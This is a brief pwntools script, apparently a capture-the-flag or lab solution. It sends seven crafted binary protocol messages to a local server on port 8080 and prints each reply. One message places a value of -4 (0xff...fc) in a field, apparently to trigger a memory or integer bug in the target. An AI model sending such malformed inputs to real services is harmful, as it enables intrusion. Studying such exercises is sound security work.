from pwn import *

r = remote("127.0.0.1", 8080)

message = b'\x00\x00' \
          b'\x00\x23' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0a' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0a' \
          b'\x42'

r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x23' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0f' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0f' \
          b'\x53'


r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x23' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x03' \
          b'\x00\x00\x00\x00\x00\x00\x00\x04' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0f' \
          b'\x42'

r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x12' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x03' \
          b'\x00\x00\x00\x00\x00\x00\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x05' \

r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x23' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x01' \
          b'\x00\x00\x00\x00\x00\x00\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x04' \
          b'\x00\x00\x00\x00\x00\x00\x00\x14' \
          b'\x00\x00\x00\x00\x00\x00\x00\x0f' \
          b'\x42'

r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x22' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x04' \
          b'\x00\x00\x00\x00\x00\x00\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x00' \
          b'\xff\xff\xff\xff\xff\xff\xff\xfc' \
          b'\x00\x00\x00\x00\x00\x00\x00\x00'

r.sendline(message)
print(r.recv())

message = b'\x00\x00' \
          b'\x00\x0a' \
          b'\x11\x11\x22\x22' \
          b'\x33\x33\x44\x44\x00\x01\x00\x00' \
          b'\x00\x02' \
          b'\x00\x00\x00\x00\x00\x00\x00\x03'

r.sendline(message)
print(r.recv())
